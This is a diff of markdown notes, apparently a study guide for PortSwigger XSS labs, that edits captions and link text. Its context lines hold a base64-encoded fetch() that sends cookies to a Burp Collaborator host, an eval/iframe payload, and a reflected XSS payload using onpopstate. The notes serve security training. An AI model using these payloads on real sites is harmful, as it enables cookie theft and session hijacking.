@@ -47,7 +47,7 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
   + Function("code")()
   
 
-![This image show after entering the above into search and the collaborator receiving request with base64 cookie value from us.](xss1.png)  
+![Burp collaborator receiving request with base64 cookie value from our POC.](xss1.png)  
 
 >Hosting the **IFRAME** with eval() and fetch() payload on web exploit server, respectively base64 encoded and URL encoded.  
 
@@ -70,9 +70,11 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 ```JavaScript
 ?search=%22%3E%3Cbody%20onpopstate=print()>
 ```
-[onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
+[Example: onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
 
-[Methodology to identify allowed tags and events - PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
+>The below lab gives great Methodology to identify allowed HTML tags and events for crafting POC XSS.  
+
+[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
 
 #### URL and Base64 online encoders and decoders  
 
